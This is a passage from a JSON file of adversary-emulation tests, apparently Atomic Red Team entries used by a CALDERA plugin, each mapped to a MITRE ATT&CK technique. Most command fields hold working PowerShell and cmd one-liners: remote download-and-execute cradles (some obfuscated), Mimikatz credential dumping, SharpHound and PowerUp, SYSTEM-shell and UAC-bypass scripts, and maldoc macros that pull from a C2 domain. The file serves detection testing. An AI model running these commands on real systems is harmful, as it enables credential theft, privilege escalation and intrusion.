            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "dfdef9d6526e992043fd0209729e0bf8",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3ee7020bd7459eab27bae7e95e752e25": {
        "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"C:\\Users\\$env:username\\Desktop\\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt\" -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macroCode = Get-Content \"#{macro_path}\" -Raw; $URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"; Invoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3ee7020bd7459eab27bae7e95e752e25",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "14ce698d86efe4b5ae828e595840e9ac": {
        "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1106",
            "name": "Native API"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"%tmp%\\T1106.exe\" /target:exe 7175f8_CreateProcess.cs && %tmp%/T1106.exe",
                    "payloads": [
                        "7175f8_CreateProcess.cs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "14ce698d86efe4b5ae828e595840e9ac",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6dbada37ec09d7bb640deec0af59eaf5": {
        "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Try {;     New-PSSession -ComputerName $env:COMPUTERNAME -ErrorAction Stop | Out-Null;      ; } ; Catch {;     Enable-PSRemoting; };  ;  New-PSSession -ComputerName $env:COMPUTERNAME; Test-Connection $env:COMPUTERNAME; Set-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"; Get-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use; Remove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6dbada37ec09d7bb640deec0af59eaf5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f71199dcf1e307fc37c5a0cb9e4031b9": {
        "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$file1 = \"$env:Temp\\test10.lnk\"; $file2 = \"$env:Temp\\a.exe\"; Remove-Item $file1 -ErrorAction Ignore; Remove-Item $file2 -ErrorAction Ignore",
                    "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"; $file1 = \"$env:Temp\\test10.lnk\"; Start-Process $file1; Start-Sleep -s 10; taskkill /IM a.exe /F",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f71199dcf1e307fc37c5a0cb9e4031b9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b492e690d7d56f96a350a436b08493fb": {
        "description": "Powershell execution of known Malicious PowerShell Cmdlets",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$malcmdlets = \"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"; foreach ($cmdlets in $malcmdlets) {;     \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}; foreach ($cmdlets in $malcmdlets) {;     $cmdlets}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b492e690d7d56f96a350a436b08493fb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9cbe6aa572eed558bf7825df0726c1cb": {
        "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9cbe6aa572eed558bf7825df0726c1cb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0ecc3d4729cf37c719528291d63f9f99": {
        "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:Temp\\*BloodHound.zip -Force",
                    "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0ecc3d4729cf37c719528291d63f9f99",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ba763ea19604a73e3e1f9d9d8d86d9cc": {
        "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ba763ea19604a73e3e1f9d9d8d86d9cc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6efbccc1869e8cd618c0d3ecda407d5f": {
        "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6efbccc1869e8cd618c0d3ecda407d5f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f6297d156d5b30fbef5212ac5f1f76ee": {
        "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f6297d156d5b30fbef5212ac5f1f76ee",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c52954153b1c232afb69f38ea60e76fe": {
        "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c52954153b1c232afb69f38ea60e76fe",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "48a861eb5802bd7abdaa64b4fcd30924": {
        "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if(2 -in $PSVersionTable.PSCompatibleVersions.Major) { ; } else {Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually};  ;  powershell.exe -version 2 -Command Write-Host $PSVersion",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "48a861eb5802bd7abdaa64b4fcd30924",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9cca46473bbf2259c8101f374b55b6fa": {
        "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:Temp\\*BloodHound.zip -Force",
                    "command": "write-host \"Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\\T1059.001\\src\" -ForegroundColor Cyan; import-module PathToAtomicsFolder\\T1059.001\\src\\SharpHound.ps1; Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9cca46473bbf2259c8101f374b55b6fa",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "bab5b923c6f235908dbee26637e8397d": {
        "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.005",
            "name": "Command and Scripting Interpreter: Visual Basic"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1059.005.out.txt -ErrorAction Ignore",
                    "command": "cscript a771e6_sys_info.vbs > $env:TEMP\\T1059.005.out.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "a771e6_sys_info.vbs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "bab5b923c6f235908dbee26637e8397d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9ca356dd308211bf2af7b34a546fcf70": {
        "description": "Executes powershell.exe with variations of the -EncodedCommand parameter",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9ca356dd308211bf2af7b34a546fcf70",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ef943918da20ee40d378ad000bbcc3b7": {
        "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs(); Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ef943918da20ee40d378ad000bbcc3b7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b7d34f7b28d202f7216f3afdb889bf5d": {
        "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b7d34f7b28d202f7216f3afdb889bf5d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2ca71106ee0aff2eda551bb6ed2b39e4": {
        "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1106",
            "name": "Native API"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2ca71106ee0aff2eda551bb6ed2b39e4",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "44bb962b6c2f39970fbbe84e3050c5d7": {
        "description": "Executes powershell.exe with variations of the -Command parameter",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "44bb962b6c2f39970fbbe84e3050c5d7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "59301935c261de08fabf343aed5fb5f5": {
        "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "59301935c261de08fabf343aed5fb5f5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9c955a373154a7090d4b4396b561f5da": {
        "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.005",
            "name": "Command and Scripting Interpreter: Visual Basic"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"}  | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9c955a373154a7090d4b4396b561f5da",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "843bfc63b18f78a56df80c4b42e876f2": {
        "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\NTFS_ADS.txt -Force -ErrorAction Ignore",
                    "command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]) { ; } else {Write-Host Prereq's for this test cannot be met automatically};  ;  Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'; $streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'; Invoke-Expression $streamcommand",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "843bfc63b18f78a56df80c4b42e876f2",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b262964145fa55e27265e7caa89b1169": {
        "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1106",
            "name": "Native API"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b262964145fa55e27265e7caa89b1169",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f38e58deb7ad20b5538ca40db7b7b4f8": {
        "description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.003",
            "name": "Command and Scripting Interpreter: Windows Command Shell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del \"%TEMP%\\test.bin\" >nul 2>&1",
                    "command": "echo \"Hello from the Windows Command Prompt!\" > \"%TEMP%\\test.bin\" & type \"%TEMP%\\test.bin\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f38e58deb7ad20b5538ca40db7b7b4f8",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d56753da33c882128773634140c0efa5": {
        "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d56753da33c882128773634140c0efa5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6c318ef0339d74d909ad556681b6493e": {
        "description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.003",
            "name": "Command and Scripting Interpreter: Windows Command Shell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6c318ef0339d74d909ad556681b6493e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "afe32d76ebb32d20d0b43707bf271beb": {
        "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects",
        "tactic": "reconnaissance",
        "technique": {
            "attack_id": "T1592.002",
            "name": "Gather Victim Host Information: Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1592.002Test1.txt -force -erroraction silentlycontinue; remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue",
                    "command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\"); {try{write-output \"$($Position)-$($CLSID)\"; write-output \"------------\"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "afe32d76ebb32d20d0b43707bf271beb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2bf646d7610d9beea487c4332703af94": {
